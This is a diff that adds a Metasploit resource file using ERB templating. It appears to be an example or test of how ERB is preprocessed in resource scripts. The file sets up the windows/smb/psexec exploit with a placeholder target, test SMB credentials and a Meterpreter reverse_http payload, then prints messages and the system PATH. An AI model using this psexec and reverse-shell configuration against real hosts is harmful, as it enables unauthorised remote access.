@@ -1,0 +1,24 @@
+<%
+
+rhost = "10.0.0.1"
+smbuser = "test"
+smbpass = "pass"
+payload = "windows/meterpreter/reverse_http"
+
+puts "This will happen while i preprocess an erb-enabled rc file" 
+%>
+
+use windows/smb/psexec
+set RHOST <%= rhost %>
+set SMBUser <%= smbuser %>
+set SMBPass <%= smbpass %>
+set PAYLOAD <%= payload %>
+save
+
+<ruby>
+ puts "Now, i should print the system path while running the actual resource file! "
+ puts ENV["PATH"]
+ puts "end"
+</ruby>
+
+<%= puts "This will also happen when i preprocess too" %>
